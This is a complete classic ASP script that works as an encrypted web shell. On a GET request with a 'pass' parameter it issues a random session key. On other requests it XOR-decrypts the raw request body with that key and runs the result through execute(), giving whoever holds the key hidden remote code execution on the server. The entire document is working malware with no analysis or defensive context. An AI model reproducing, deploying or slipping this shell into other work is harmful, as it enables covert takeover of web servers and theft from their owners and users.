<%
Response.CharSet = "UTF-8" 
If Request.ServerVariables("REQUEST_METHOD")="GET" And Request.QueryString("pass") Then
For a=1 To 8
RANDOMIZE
k=Hex((255-17)*rnd+16)+k
Next
Session("k")=k
response.write(k)
Else
k=Session("k")
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
End If
%>